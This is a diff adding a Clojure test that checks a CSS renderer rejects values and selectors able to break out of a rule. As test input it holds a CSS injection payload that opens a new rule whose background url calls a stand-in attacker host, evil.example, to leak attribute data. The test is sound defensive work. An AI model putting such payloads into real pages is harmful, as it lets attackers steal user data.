@@ -12,6 +12,23 @@
   (is (= "@keyframes fade { 0% { opacity: 0; } 100% { opacity: 1; } }"
          (css/kf :fade [[0 {:opacity 0}] [100 {:opacity 1}]]))))
 
+(deftest rejects-values-and-selectors-that-would-break-out-of-the-rule
+  ;; { } ; and /* let attacker-controlled data close the current
+  ;; declaration/rule and inject arbitrary sibling CSS -- verified against
+  ;; tinycss2 (a real CSS parser): the unfixed renderer's output for this
+  ;; exact value parsed as TWO distinct rules, not one, a genuine rule
+  ;; injection (an attribute-selector-based data-exfiltration primitive),
+  ;; not a cosmetic issue.
+  (is (thrown? clojure.lang.ExceptionInfo
+               (css/style {:color (str "red; } .evil[href^=\"http\"] "
+                                        "{ background: url(https://evil.example/leak?c=")})))
+  (is (thrown? clojure.lang.ExceptionInfo
+               (css/rule ".safe { color: blue; } .evil" {:color "red"}))
+      "selector, not just value, must be checked")
+  (is (thrown? clojure.lang.ExceptionInfo (css/style {:color "red;"})) "bare semicolon")
+  (is (thrown? clojure.lang.ExceptionInfo (css/style {:color "/* x */red"})) "comment-start")
+  (is (= "color: red;" (css/style {:color "red"})) "ordinary values are unaffected"))
+
 (deftest renders-sheet
   (let [sheet (css/css {:rules {".card" {:padding 12}}
                         :media {"(max-width: 600px)" {".card" {:padding 8}}}})]
